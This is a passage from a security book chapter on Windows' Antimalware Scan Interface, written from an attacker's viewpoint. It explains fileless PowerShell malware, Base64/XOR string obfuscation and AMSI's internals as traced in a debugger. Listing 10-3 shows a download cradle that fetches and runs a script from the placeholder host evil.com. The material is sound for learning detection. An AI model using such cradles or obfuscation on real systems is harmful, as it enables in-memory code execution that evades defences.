<html><head></head><body>
<section epub:type="chapter" role="doc-chapter" aria-labelledby="ch10">&#13;
<header>&#13;
<h1 class="CHAPTER" id="ch10">&#13;
<span class="CN"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_183" aria-label=" Page 183. "/><samp class="SANS_Futura_Std_Bold_Condensed_B_11">10</samp></span>&#13;
<span class="CT"><samp class="SANS_Dogma_OT_Bold_B_11">ANTIMALWARE SCAN INTERFACE</samp></span>&#13;
</h1>&#13;
</header>&#13;
<figure class="opener"><img class="opener" src="../images/opener-img.png" alt=""/>&#13;
</figure>&#13;
<p class="CO">As security vendors began building effective tools for detecting the deployment and execution of compiled malware, attackers were left searching for alternative methods to execute their code. One of the tactics they discovered is the creation of script-based, or <i>fileless</i>, malware, which relies on the use of tools built into the operating system to execute code that will give the attacker control over the system.</p>&#13;
<p class="TX">To help protect users against these novel threats, Microsoft introduced the <i>Antimalware Scan Interface (AMSI)</i> with the release of Windows 10. AMSI provides an interface that allows application developers to leverage antimalware providers registered on the system when determining if the data with which they are working is malicious.</p>&#13;
<p class="TX">AMSI is an omnipresent security feature in today’s operating environments. Microsoft has instrumented many of the scripting engines, <span role="doc-pagebreak" epub:type="pagebreak" id="pg_184" aria-label=" Page 184. "/>frameworks, and applications that we, as attackers, routinely target. Nearly every EDR vendor ingests events from AMSI, and some go so far as to attempt to detect attacks that tamper with the registered providers. This chapter covers the history of AMSI, its implementation in different Windows components, and the diverse world of AMSI evasions.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
<h2 class="H1" id="sec1"><span id="h-136"/><samp class="SANS_Futura_Std_Bold_B_11">The Challenge of Script-Based Malware</samp></h2>&#13;
<p class="TNI">Scripting languages offer a large number of advantages over compiled languages. They require less development time and overhead, bypass application allow-listing, can execute in memory, and are portable. They also provide the ability to use the features of frameworks such as .NET and, oftentimes, direct access to the Win32 API, which greatly extends the functionality of the scripting language.</p>&#13;
<p class="TX">While script-based malware existed in the wild prior to AMSI’s creation, the 2015 release of Empire, a command-and-control framework built around PowerShell, made its use mainstream in the offensive world. Because of its ease of use, default integration into Windows 7 and above, and large amount of existing documentation, PowerShell became the de facto language for offensive tool development for many.</p>&#13;
<p class="TX">This boom in script-based malware caused a large defensive gap. Previous tools relied on the fact that malware would be dropped to disk and executed. They fell short when faced with malware that ran a Microsoft-signed executable installed on the system by default, sometimes referred to as <i>living-off-the-land</i>, such as PowerShell. Even agents that attempted to detect the invocation of malicious scripts struggled, as attackers could easily adapt their payloads and tools to evade the detection techniques employed by vendors. Microsoft itself highlights this problem in its blog post announcing AMSI, which provides the following example. Say that a defensive product searched a script for the string “malware” to determine whether it was malicious. It would detect the following code:</p>&#13;
<pre><code>PS &gt; <b>Write-Host "malware";</b></code></pre>&#13;
<p class="TX">Once malware authors became aware of this detection logic, they could bypass the detection mechanism using something as simple as string concatenation:</p>&#13;
<pre><code>PS &gt; <b>Write-Host "mal" + "ware";</b></code></pre>&#13;
<p class="TX">To combat this, developers would attempt some basic type of language emulation. For example, they might concatenate strings before scanning the contents of the script block. Unfortunately, this approach is prone to error, as languages often have many different ways to represent data, and cataloging them all for emulation is very difficult. Antimalware developers did have some success with the technique, however. As a result, malware <span role="doc-pagebreak" epub:type="pagebreak" id="pg_185" aria-label=" Page 185. "/>developers raised the complexity of their obfuscation slightly with techniques such as encoding. The example in <a href="#list10-1">Listing 10-1</a> shows the string “malware” encoded using Base64 in PowerShell.</p>&#13;
<pre id="list10-1"><code>PS &gt; <b>$str = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(</b>&#13;
<b>&gt;&gt; "bWFsd2FyZQ=="));</b>&#13;
PS &gt; <b>Write-Host $str;</b></code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-1: Decoding a Base64 string in PowerShell</span></p>&#13;
<p class="TX">Agents again leveraged language emulation to decode data in the script and scan it for malicious content. To combat this success, malware developers moved from simple encoding to encryption and algorithmic encoding, such as with exclusive-or (XOR). For example, the code in <a href="#list10-2">Listing 10-2</a> first decodes the Base64-encoded data and then uses the two-byte key <samp class="SANS_TheSansMonoCd_W5Regular_11">gg</samp> to XOR the decoded bytes.</p>&#13;
<pre id="list10-2"><code>$key = "gg"&#13;
$data = "CgYLEAYVAg=="&#13;
$bytes = [System.Convert]::FromBase64String($data);&#13;
&#13;
$decodedBytes = @();&#13;
for ($i = 0; $i -lt $bytes.Count; $i++) {&#13;
    $decodedBytes += $bytes[$i] -bxor $key[$i % $key.Length];&#13;
}&#13;
$payload = [system.Text.Encoding]::UTF8.getString($decodedBytes);&#13;
Write-Host $payload;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-2: An XOR example in PowerShell</span></p>&#13;
<p class="TX">This trend toward encryption exceeded what the antimalware engines could reasonably emulate, so detections based on the presence of the obfuscation techniques themselves became commonplace. This presents its own challenges, due to the fact that normal, benign scripts sometimes employ what may look like obfuscation. The example Microsoft put forward in its post, and one that became the standard for executing PowerShell code in memory, is the download cradle in <a href="#list10-3">Listing 10-3</a>.</p>&#13;
<pre id="list10-3"><code>PS &gt; <b>Invoke-Expression (New-Object Net.Webclient).</b>&#13;
<b>&gt;&gt; downloadstring("</b><b>https://evil.com/payloadl.ps1")</b></code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-3: A simple PowerShell download cradle</span></p>&#13;
<p class="TX">In this example, the .NET <samp class="SANS_TheSansMonoCd_W5Regular_11">Net.Webclient</samp> class is used to download a PowerShell script from an arbitrary site. When this script is downloaded, it isn’t written to disk but rather lives as a string in memory tied to the <samp class="SANS_TheSansMonoCd_W5Regular_11">Webclient</samp> object. From here, the adversary uses the <samp class="SANS_TheSansMonoCd_W5Regular_11">Invoke-Expression</samp> cmdlet to run this string as a PowerShell command. This technique results in whatever action the payload may take, such as deploying a new command-and-control agent, occurring entirely in memory.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
<h2 class="H1" id="sec2"><span id="h-137"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_186" aria-label=" Page 186. "/><samp class="SANS_Futura_Std_Bold_B_11">How AMSI Works</samp></h2>&#13;
<p class="TNI">AMSI scans a target, then uses antimalware providers registered on the system to determine whether it is malicious. By default, it uses the antimalware provider Microsoft Defender IOfficeAntivirus (<i>MpOav.dll</i>), but third-party EDR vendors may also register their own providers. Duane Michael maintains a list of security vendors who register AMSI providers in his “whoamsi” project on GitHub.</p>&#13;
<p class="TX">You’ll most commonly find AMSI used by applications that include scripting engines (for example, those that accept arbitrary scripts and execute them using the associated engine), work with untrusted buffers in memory, or interact with non-PE executable code, such as <i>.docx</i> and <i>.pdf</i> files. AMSI is integrated into many Windows components, including modern versions of PowerShell, .NET, JavaScript, VBScript, Windows Script Host, Office VBA macros, and User Account Control. It is also integrated into Microsoft Exchange.</p>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
<h3 class="H2" id="sec3"><span id="h-138"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Exploring PowerShell’s AMSI Implementation</samp></h3>&#13;
<p class="TNI">Because PowerShell is open source, we can examine its AMSI implementation to understand how Windows components use this tool. In this section, we explore how AMSI attempts to restrict this application from executing malicious scripts.</p>&#13;
<p class="TX">Inside <i>System.Management.Automation.dll</i>, the DLL that provides the runtime for hosting PowerShell code, there exists a non-exported function called <samp class="SANS_TheSansMonoCd_W5Regular_11">PerformSecurityChecks()</samp> that is responsible for scanning the supplied script block and determining whether it is malicious. This function is called by the command processor created by PowerShell as part of the execution pipeline just before compilation. The call stack in <a href="#list10-4">Listing 10-4</a>, captured in dnSpy, demonstrates the path the script block follows until it is scanned.</p>&#13;
<pre id="list10-4"><code>System.Management.Automation.dll!CompiledScriptBlockData.PerformSecurityChecks()&#13;
System.Management.Automation.dll!CompiledScriptBlockData.ReallyCompile(bool optimize)&#13;
System.Management.Automation.dll!CompiledScriptBlockData.CompileUnoptimized()&#13;
System.Management.Automation.dll!CompiledScriptBlockData.Compile(bool optimized)&#13;
System.Management.Automation.dll!ScriptBlock.Compile(bool optimized)&#13;
System.Management.Automation.dll!DlrScriptCommandProcessor.Init()&#13;
System.Management.Automation.dll!DlrScriptCommandProcessor.DlrScriptCommandProcessor(Script&#13;
    Block scriptBlock, ExecutionContext context, bool useNewScope, CommandOrigin origin,&#13;
    SessionStateInternal sessionState, object dollarUnderbar)&#13;
System.Management.Automation.dll!Runspaces.Command.CreateCommandProcessor(ExecutionContext&#13;
    executionContext, bool addToHistory, CommandOrigin origin)&#13;
System.Management.Automation.dll!Runspaces.LocalPipeline.CreatePipelineProcessor()&#13;
System.Management.Automation.dll!Runspaces.LocalPipeline.InvokeHelper()&#13;
System.Management.Automation.dll!Runspaces.LocalPipeline.InvokeThreadProc()&#13;
System.Management.Automation.dll!Runspaces.LocalPipeline.InvokeThreadProcImpersonate()&#13;
System.Management.Automation.dll!Runspaces.PipelineThread.WorkerProc()&#13;
System.Private.CoreLib.dll!System.Threading.Thread.StartHelper.RunWorker()&#13;
System.Private.CoreLib.dll!System.Threading.Thread.StartHelper.Callback(object state)&#13;
System.Private.CoreLib.dll!System.Threading.ExecutionContext.RunInternal(<var>--snip--</var>)<span role="doc-pagebreak" epub:type="pagebreak" id="pg_187" aria-label=" Page 187. "/>&#13;
System.Private.CoreLib.dll!System.Threading.Thread.StartHelper.Run()&#13;
System.Private.CoreLib.dll!System.Threading.Thread.StartCallback()&#13;
[Native to Managed Transition]</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-4: The call stack during the scanning of a PowerShell script block</span></p>&#13;
<p class="TX">This function calls an internal utility, <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiUtils.ScanContent()</samp>, passing in the script block or file to be scanned. This utility is a simple wrapper for another internal function, <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiUtils.WinScanContent()</samp>, where all the real work takes place.</p>&#13;
<p class="TX">After checking the script block for the European Institute for Computer Antivirus Research (EICAR) test string, which all antiviruses must detect, <samp class="SANS_TheSansMonoCd_W5Regular_11">WinScanContent</samp>’s first action is to create a new AMSI session via a call to <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!AmsiOpenSession()</samp>. AMSI sessions are used to correlate multiple scan requests. Next, <samp class="SANS_TheSansMonoCd_W5Regular_11">WinScanContent()</samp> calls <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!AmsiScanBuffer()</samp>, the Win32 API function that will invoke the AMSI providers registered on the system and return the final determination regarding the maliciousness of the script block. <a href="#list10-5">Listing 10-5</a> shows this implementation in PowerShell, with the irrelevant bits trimmed.</p>&#13;
<pre id="list10-5"><code>lock (s_amsiLockObject)&#13;
{&#13;
    <var>--snip--</var>&#13;
&#13;
    if (s_amsiSession == IntPtr.Zero)&#13;
    {&#13;
      <span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> hr = AmsiNativeMethods.AmsiOpenSession(&#13;
          s_amsiContext,&#13;
          ref s_amsiSession&#13;
        );&#13;
&#13;
        AmsiInitialized = true;&#13;
&#13;
        if (!Utils.Succeeded(hr))&#13;
        {&#13;
            s_amsiInitFailed = true;&#13;
            return AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;&#13;
        }&#13;
    }&#13;
&#13;
    <var>--snip--</var>&#13;
&#13;
    AmsiNativeMethods.AMSI_RESULT result =&#13;
      AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_CLEAN;&#13;
&#13;
    unsafe&#13;
    {&#13;
        fixed (char* buffer = content)&#13;
        {&#13;
          var buffPtr = new IntPtr(buffer);&#13;
        <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> hr = AmsiNativeMethods.AmsiScanBuffer(&#13;
              s_amsiContext,&#13;
              buffPtr,<span role="doc-pagebreak" epub:type="pagebreak" id="pg_188" aria-label=" Page 188. "/>&#13;
              (uint)(content.Length * sizeof(char)),&#13;
              sourceMetadata,&#13;
              s_amsiSession,&#13;
              ref result);&#13;
      }&#13;
    }&#13;
&#13;
    if (!Utils.Succeeded(hr))&#13;
    {&#13;
      return AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;&#13;
    }&#13;
    return result;&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-5: PowerShell’s AMSI implementation</span></p>&#13;
<p class="TX">In Powershell, the code first calls <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!AmsiOpenSession()</samp> <span class="CodeAnnotation" aria-label="annotation1">❶</span> to create a new AMSI session in which scan requests can be correlated. If the session opens successfully, the data to be scanned is passed to <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!AmsiScanBuffer()</samp> <span class="CodeAnnotation" aria-label="annotation2">❷</span>, which does the actual evaluation of the data to determine if the contents of the buffer appear to be malicious. The result of this call is returned to <samp class="SANS_TheSansMonoCd_W5Regular_11">WinScanContent()</samp>.</p>&#13;
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">WinScanContent()</samp> function can return one of three values:</p>&#13;
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">AMSI_RESULT_NOT_DETECTED</samp>   A neutral result</p>&#13;
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">AMSI_RESULT_CLEAN</samp>   A result indicating that the script block did not contain malware</p>&#13;
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">AMSI_RESULT_DETECTED</samp>   A result indicating that the script block contained malware</p>&#13;
<p class="TX">If either of the first two results is returned, indicating that AMSI could not determine the maliciousness of the script block or found it not to be dangerous, the script block will be allowed to execute on the system. If, however, the <samp class="SANS_TheSansMonoCd_W5Regular_11">AMSI_RESULT_DETECTED</samp> result is returned, a <samp class="SANS_TheSansMonoCd_W5Regular_11">ParseException</samp> will be thrown, and execution of the script block will be halted. <a href="#list10-6">Listing 10-6</a> shows how this logic is implemented inside PowerShell.</p>&#13;
<pre id="list10-6"><code>if (amsiResult == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)&#13;
{&#13;
    var parseError = new ParseError(&#13;
        scriptExtent,&#13;
        "ScriptContainedMaliciousContent",&#13;
        ParserStrings.ScriptContainedMaliciousContent);&#13;
 <span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> throw new ParseException(new[] {parseError});&#13;
}</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-6: Throwing a <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">ParseError</samp> on malicious script detection</span></p>&#13;
<p class="TX">Because AMSI threw an exception <span class="CodeAnnotation" aria-label="annotation1">❶</span>, the execution of the script halts and the error shown in the <samp class="SANS_TheSansMonoCd_W5Regular_11">ParseError</samp> will be returned to the user. <a href="#list10-7">Listing 10-7</a> shows the error the user will see in the PowerShell window.</p>&#13;
<pre id="list10-7"><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_189" aria-label=" Page 189. "/>PS &gt; <b>Write-Host "malware"</b>&#13;
ParserError:&#13;
Line |&#13;
    1 | Write-Host "malware"&#13;
      | ~~~~~~~~~~~~~~~~~~~~&#13;
      | This script contains malicious content and has been blocked by your&#13;
      | antivirus software.</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-7: The thrown error shown to the user</span></p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
<h3 class="H2" id="sec4"><span id="h-139"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Understanding AMSI Under the Hood</samp></h3>&#13;
<p class="TNI">While understanding how AMSI is instrumented in system components provides useful context for how user-supplied input is evaluated, it doesn’t quite tell the whole story. What happens when PowerShell calls <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!AmsiScanBuffer()</samp>? To understand this, we must dive deep into the AMSI implementation itself. Because the state of C++ decompilers at the time of this writing makes static analysis a bit tricky, we’ll need to use some dynamic analysis techniques. Thankfully, WinDbg makes this process relatively painless, especially considering that debug symbols are available for <i>amsi.dll</i>.</p>&#13;
<p class="TX">When PowerShell starts, it first calls <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!AmsiInitialize()</samp>. As its name suggests, this function is responsible for initializing the AMSI API. This initialization primarily centers on the creation of a COM class factory via a call to <samp class="SANS_TheSansMonoCd_W5Regular_11">DllGetClassObject()</samp>. As an argument, it receives the class identifier correlating to <i>amsi.dll</i>, along with the interface identified for the <samp class="SANS_TheSansMonoCd_W5Regular_11">IClassFactory</samp>, which enables a class of objects to be created. The interface pointer is then used to create an instance of the <samp class="SANS_TheSansMonoCd_W5Regular_11">IAntimalware</samp> interface (<samp class="SANS_TheSansMonoCd_W5Regular_11">{82d29c2e-f062-44e6-b5c9-3d9a2f24a2df}</samp>), shown in <a href="#list10-8">Listing 10-8</a>.</p>&#13;
<pre id="list10-8"><code>Breakpoint 4 hit&#13;
amsi!AmsiInitialize+0x1a9:&#13;
00007ff9`5ea733e9 ff15899d0000  call  qword ptr [amsi!_guard_dispatch_icall_fptr] <var>--snip--</var>&#13;
&#13;
0:011&gt; <b>dt OLE32!IID @r8</b>&#13;
 {82d29c2e-f062-44e6-b5c9-3d9a2f24a2df}&#13;
  +0x000 Data1            : 0x82d29c2e&#13;
  +0x004 Data2            : 0xf062&#13;
  +0x006 Data3            : 0x44e6&#13;
  +0x008 Data4            : [8] "???"&#13;
&#13;
0:011&gt; <b>dt @rax</b>&#13;
ATL::CComClassFactory::CreateInstance</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-8: Creating an instance of <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">IAntimalware</samp></span></p>&#13;
<p class="TX">Rather than an explicit call to some functions, you’ll occasionally find references to <samp class="SANS_TheSansMonoCd_W5Regular_11">_guard_dispatch_icall_fptr()</samp>. This is a component of Control Flow Guard (CFG), an anti-exploit technology that attempts to prevent indirect calls, such as in the event of return-oriented programming. In short, <span role="doc-pagebreak" epub:type="pagebreak" id="pg_190" aria-label=" Page 190. "/>this function checks the Control Flow Guard bitmap of the source image to determine if the function to be called is a valid target. In the context of this section, the reader can treat these as simple <samp class="SANS_TheSansMonoCd_W5Regular_11">CALL</samp> instructions to reduce confusion.</p>&#13;
<p class="TX">This call then eventually leads into <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!AmsiComCreateProviders</samp><samp class="SANS_TheSansMonoCd_W5Regular_11">&lt;</samp><samp class="SANS_TheSansMonoCd_W5Regular_11">IAntimalwareProvider&gt;</samp>, where all the magic happens. <a href="#list10-9">Listing 10-9</a> shows the call stack for this method inside WinDbg.</p>&#13;
<pre id="list10-9"><code>0:011&gt; <b>kc</b>&#13;
 # Call Site&#13;
00 amsi!AmsiComCreateProviders&lt;IAntimalwareProvider&gt;&#13;
01 amsi!CamsiAntimalware::FinalConstruct&#13;
02 amsi!ATL::CcomCreator&lt;ATL::CcomObject&lt;CamsiAntimalware&gt; &gt;::CreateInstance&#13;
03 amsi!ATL::CcomClassFactory::CreateInstance&#13;
04 amsi!AmsiInitialize&#13;
<var>--snip--</var></code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-9: The call stack for the <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">AmsiComCreateProviders</samp> function</span></p>&#13;
<p class="TX">The first major action is a call to <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!CGuidEnum::StartEnum()</samp>. This function receives the string <samp class="SANS_TheSansMonoCd_W5Regular_11">"Software\\Microsoft\\AMSI\\Providers"</samp>, which it passes into a call to <samp class="SANS_TheSansMonoCd_W5Regular_11">RegOpenKey()</samp> and then <samp class="SANS_TheSansMonoCd_W5Regular_11">RegQueryInfoKeyW()</samp> in order to get the number of subkeys. Then, <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!CGuidEnum::NextGuid()</samp> iterates through the subkeys and converts the class identifiers of registered AMSI providers from strings to UUIDs. After enumerating all the required class identifiers, it passes execution to <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!AmsiComSecureLoadInProcServer()</samp>, where the <samp class="SANS_TheSansMonoCd_W5Regular_11">InProcServer32</samp> value corresponding to the AMSI provider is queried via <samp class="SANS_TheSansMonoCd_W5Regular_11">RegGetValueW()</samp>. <a href="#list10-10">Listing 10-10</a> shows this process for <i>MpOav.dll</i>.</p>&#13;
<pre id="list10-10"><code>0:011&gt; <b>u @rip L1</b>&#13;
amsi!AmsiComSecureLoadInProcServer+0x18c:&#13;
00007ff9`5ea75590 48ff1589790000  call    qword ptr [amsi!_imp_RegGetValueW]&#13;
&#13;
0:011&gt; <b>du @rdx</b>&#13;
00000057`2067eaa0  "Software\Classes\CLSID\{2781761E"&#13;
00000057`2067eae0  "-28E0-4109-99FE-B9D127C57AFE}\In"&#13;
00000057`2067eb20  "procServer32"</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-10: The parameters passed to <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">RegGetValueW</samp></span></p>&#13;
<p class="TX">Next, <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!CheckTrustLevel()</samp> is called to check the value of the registry key <i>SOFTWARE\Microsoft\AMSI\FeatureBits</i>. This key contains a DWORD, which can be either <samp class="SANS_TheSansMonoCd_W5Regular_11">1</samp> (the default) or <samp class="SANS_TheSansMonoCd_W5Regular_11">2</samp> to disable or enable Authenticode signing checks for providers. If Authenticode signing checks are enabled, the path listed in the <samp class="SANS_TheSansMonoCd_W5Regular_11">InProcServer32</samp> registry key is verified. Following a successful check, the path is passed into <samp class="SANS_TheSansMonoCd_W5Regular_11">LoadLibraryW()</samp> to load the AMSI provider DLL, as demonstrated in <a href="#list10-11">Listing 10-11</a>.</p>&#13;
<pre id="list10-11"><code>0:011&gt; <b>u @rip L1</b>&#13;
amsi!AmsiComSecureLoadInProcServer+0x297:&#13;
00007ff9`5ea7569b 48ff15fe770000  call    qword ptr [amsi!_imp_LoadLibraryExW]<span role="doc-pagebreak" epub:type="pagebreak" id="pg_191" aria-label=" Page 191. "/>&#13;
&#13;
0:011&gt; <b>du @rcx</b>&#13;
00000057`2067e892 "C:\ProgramData\Microsoft\Windows"&#13;
00000057`2067e8d2 " Defender\Platform\4.18.2111.5-0"&#13;
00000057`2067e912 "\MpOav.dll"</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-11: The</span> <span class="eSANS_Futura_Std_Book_11a">MpOav.dll</span> loaded via <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">LoadLibraryW()</samp></p>&#13;
<p class="TX">If the provider DLL loads successfully, its <samp class="SANS_TheSansMonoCd_W5Regular_11">DllRegisterServer()</samp> function is called to tell it to create registry entries for all COM classes supported by the provider. This cycle repeats calls to <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!CGuidEnum::NextGuid()</samp> until all providers are loaded. <a href="#list10-12">Listing 10-12</a> shows the final step: invoking the <samp class="SANS_TheSansMonoCd_W5Regular_11">QueryInterface()</samp> method for each provider in order to get a pointer to the <samp class="SANS_TheSansMonoCd_W5Regular_11">IAntimalware</samp> interfaces.</p>&#13;
<pre id="list10-12"><code>0:011&gt; <b>dt OLE32!IID @rdx</b>&#13;
  {82d29c2e-f062-44e6-b5c9-3d9a2f24a2df}&#13;
  +0x000 Data1            : 0x82d29c2e&#13;
  +0x004 Data2            : 0xf062&#13;
  +0x006 Data3            : 0x44e6&#13;
  +0x008 Data4            : [8] "???"&#13;
&#13;
0:011&gt; <b>u @rip L1</b>&#13;
amsi!ATL::CComCreator&lt;ATL::CComObject&lt;CAmsiAntimalware&gt; &gt;::CreateInstance+0x10d:&#13;
00007ff8`0b7475bd ff15b55b0000  call  qword ptr [amsi!_guard_dispatch_icall_fptr]&#13;
&#13;
0:011&gt; <b>t</b>&#13;
amsi!ATL::CComObject&lt;CAmsiAntimalware&gt;::QueryInterface:&#13;
00007ff8`0b747a20 4d8bc8       mov         r9,r8</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-12: Calling <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">QueryInterface</samp> on the registered provider</span></p>&#13;
<p class="TX">After <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiInitialize()</samp> returns, AMSI is ready to go. Before PowerShell begins evaluating a script block, it calls <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiOpenSession()</samp>. As mentioned previously, this function allows AMSI to correlate multiple scans. When this function completes, it returns a <samp class="SANS_TheSansMonoCd_W5Regular_11">HAMSISESSION</samp> to the caller, and the caller can choose to pass this value to all subsequent calls to AMSI within the current scanning session.</p>&#13;
<p class="TX">When PowerShell’s AMSI instrumentation receives a script block and an AMSI session has been opened, it calls <samp class="SANS_TheSansMonoCd_W5Regular_11">AmsiScanBuffer()</samp> with the script block passed as input. This function is defined in <a href="#list10-13">Listing 10-13</a>.</p>&#13;
<pre id="list10-13"><code>HRESULT AmsiScanBuffer(&#13;
  [in]            HAMSICONTEXT amsiContext,&#13;
  [in]            PVOID        buffer,&#13;
  [in]            ULONG        length,&#13;
  [in]            LPCWSTR      contentName,&#13;
  [in, optional]  HAMSISESSION amsiSession,&#13;
  [out]           AMSI_RESULT  *result&#13;
);</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-13: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">AmsiScanBuffer()</samp> definition</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_192" aria-label=" Page 192. "/>The function’s primary responsibility is to check the validity of the parameters passed to it. This includes checks for content in the input buffer and the presence of a valid <samp class="SANS_TheSansMonoCd_W5Regular_11">HAMSICONTEXT</samp> handle with a tag of <samp class="SANS_TheSansMonoCd_W5Regular_11">AMSI</samp>, as you can see in the decompilation in <a href="#list10-14">Listing 10-14</a>. If any of these checks fail, the function returns <samp class="SANS_TheSansMonoCd_W5Regular_11">E_INVALIDARG</samp> (0x80070057) to the caller.</p>&#13;
<pre id="list10-14"><code>if (!buffer)&#13;
 return 0x80070057;&#13;
if (!length)&#13;
 return 0x80070057;&#13;
if (!result)&#13;
 return 0x80070057;&#13;
if (!amsiContext)&#13;
 return 0x80070057;&#13;
if (*amsiContext != 'ISMA')&#13;
 return 0x80070057;&#13;
if (!*(amsiContext + 1))&#13;
 return 0x80070057;&#13;
v10 = *(amsiContext + 2);&#13;
if (!v10)&#13;
 return 0x80070057;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-14: Internal <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">AmsiScanBuffer()</samp> sanity checks</span></p>&#13;
<p class="TX">If these checks pass, AMSI invokes <samp class="SANS_TheSansMonoCd_W5Regular_11">amsi!CAmsiAntimalware::Scan()</samp>, as shown in the call stack in <a href="#list10-15">Listing 10-15</a>.</p>&#13;
<pre id="list10-15"><code>0:023&gt; <b>kc</b>&#13;
  # Call Site&#13;
00 amsi!CAmsiAntimalware::Scan&#13;
01 amsi!AmsiScanBuffer&#13;
02 System_Management_Automation_ni&#13;
<var>--snip--</var></code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-15: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">Scan()</samp> method called</span></p>&#13;
<p class="TX">This method contains a <samp class="SANS_TheSansMonoCd_W5Regular_11">while</samp> loop that iterates over every registered AMSI provider (the count of which is stored at <samp class="SANS_TheSansMonoCd_W5Regular_11">R14</samp> + <samp class="SANS_TheSansMonoCd_W5Regular_11">0x1c0</samp>). In this loop, it calls the <samp class="SANS_TheSansMonoCd_W5Regular_11">IAntimalwareProvider::Scan()</samp> function, which the EDR vendor can implement however they wish; it is only expected to return an <samp class="SANS_TheSansMonoCd_W5Regular_11">AMSI_RESULT</samp>, defined in <a href="#list10-16">Listing 10-16</a>.</p>&#13;
<pre id="list10-16"><code>HRESULT Scan(&#13;
  [in]  IAmsiStream *stream,&#13;
  [out] AMSI_RESULT *result&#13;
);</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 10-16: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">CAmsiAntimalware::Scan()</samp> function definition</span></p>&#13;
<p class="TX">In the case of the default Microsoft Defender AMSI implementation, <i>MpOav.dll</i>, this function performs some basic initialization and then hands execution over to <i>MpClient.dll</i>, the Windows Defender client interface. Note that Microsoft doesn’t supply program database files for Defender <span role="doc-pagebreak" epub:type="pagebreak" id="pg_193" aria-label=" Page 193. "/>components, so <i>MpOav.dll</i>’s function name in the call stack in <a href="#list10-17">Listing 10-17</a> is incorrect.</p>&#13;
<pre id="list10-17"><code>0:000&gt; <b>kc</b>&#13;
 # Call Site&#13;
00 MPCLIENT!MpAmsiScan&#13;
01 MpOav!DllRegisterServer&#13;
02 amsi!CAmsiAntimalware::Scan&#13;
03 amsi!AmsiScanBuffer</code></pre>&#13;
